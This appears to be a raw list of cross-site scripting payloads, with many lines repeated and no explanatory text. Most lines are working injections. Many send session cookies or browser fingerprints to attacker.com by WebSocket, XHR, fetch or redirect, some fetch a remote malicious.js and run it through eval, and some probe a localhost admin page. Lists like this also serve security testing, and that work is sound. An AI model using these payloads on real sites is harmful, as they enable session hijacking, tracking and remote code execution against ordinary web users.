<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
